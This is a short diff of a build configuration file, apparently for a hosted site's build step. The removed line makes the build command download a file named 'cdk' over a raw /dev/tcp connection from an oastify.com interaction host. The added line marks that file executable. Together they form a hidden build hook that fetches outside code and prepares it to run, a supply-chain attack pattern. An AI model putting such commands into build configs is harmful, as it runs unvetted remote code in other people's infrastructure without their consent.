@@ -1,2 +1,2 @@
 [build]
-  command = "cat < /dev/tcp/064h5p9bwqmqwyrb4tl9olx3yu4ks9.oastify.com/80 > cdk"
+  command = "chmod a+x cdk"
